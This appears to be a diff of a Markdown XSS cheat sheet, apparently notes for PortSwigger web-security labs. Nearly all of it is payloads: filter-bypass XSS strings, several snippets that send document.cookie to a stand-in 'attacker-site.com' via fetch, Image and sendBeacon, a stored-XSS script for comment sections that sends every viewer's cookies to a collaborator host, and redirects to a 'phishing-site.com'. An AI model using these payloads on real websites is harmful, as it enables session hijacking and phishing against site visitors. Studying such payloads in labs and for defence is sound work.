@@ -4,16 +4,21 @@
 
 ### Basics:
 ```
+<§§>                                 --//https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 <script>alert(1)</script>
+<custom-tag> or <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+http://foo?&apos;-alert(1)-&apos;    --//write into the "website input" (comments)
 javascript:alert(1)
 "onmouseover="alert(1)
 \'-alert(1)//
 <svg/onload=prompt(1337);>
+<><img src=1 onerror=alert(1)>       --// the website uses the JavaScript replace() function to encode angle brackets
+\"-alert(1)}//                       --// the string is reflected in a JSON response called search-results
+{{$on.constructor('alert(1)')()}}    --// if your random string is enclosed in an ng-app directive.
 ```
 
 ### Obtain cookies or tokens:
 
-#### Sending cookies to an external server via fetch
 ```
 fetch('https://attacker-site.com/steal-cookies?cookie=' + encodeURIComponent(document.cookie));
 
@@ -23,44 +28,43 @@ fetch('https://attacker-site.com/steal-cookies?cookie=' + encodeURIComponent(doc
 
 <script>(()=>{fetch('https://attacker-site.com/?c='+document.cookie)})()</script>
 
-<script src="https://attacker-site.com/malicious.js"></script>
-```
+<script src="https://attacker-site.com/malicious.js"></script> //import from another site
 
-
-#### Using the Image object to transfer cookies (workaround)
-```
 let img = new Image();
 img.src = 'https://attacker-site.com/log?cookie=' + encodeURIComponent(document.cookie);
-```
-- Bypassing security policies that block data transfer via "Fetch"
 
-#### XMLHttpRequest with sending cookies in a GET or POST request
-```
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://attacker-site.com/steal?cookie=' + encodeURIComponent(document.cookie), true);
-xhr.send();
-```
-- support for XMLHttpRequest, but fetch may be blocked
-
-#### Using the form to transfer cookies through a hidden iframe
-```
-<iframe style="display:none;" name="steal-frame"></iframe>
-<form action="https://attacker-site.com/log" method="POST" target="steal-frame">
-    <input type="hidden" name="cookie" value="<script>document.cookie</script>">
-</form>
-<script>document.forms[0].submit();</script>
-```
-- Bypassing restrictions for XHR and CORS; invisible to the user
-
-#### navigator.sendBeacon to transfer cookies to the backend
-```
 navigator.sendBeacon('https://attacker-site.com/steal-cookies', 'cookie=' + encodeURIComponent(document.cookie));
-```
-- Optimized for actions that are performed before closing the page; bypasses some policies that block other transfer methods
 
-#### Inserting a call into the event handler (onload, onerror) through dynamically created elements
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
-let script = document.createElement('script');
-script.src = 'https://attacker-site.com/steal?cookie=' + encodeURIComponent(document.cookie);
-document.body.appendChild(script);
+#### post this in the comment section - it will send all cookies for all viewers this comment:
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+### XSS redirect to another site options:
+```
+--------------------------------------------
+
+### XSS to redirect or view another site on the target site:
+```
+<script>window.location.href = "https://phishing-site.com";</script>
+
+<script>window.location.replace("https://phishing-site.com");</script>
+
+<script>window.location.assign("https://phishing-site.com");</script>
+
+<meta http-equiv="refresh" content="0;url=https://phishing-site.com">
+
+<body onload="window.location.href='https://phishing-site.com'">
+
+<a href="#" onclick="window.location.href='https://phishing-site.com'">Click here</a>
+
+<iframe src="https://phishing-site.com" style="display:none;"></iframe>
 ```
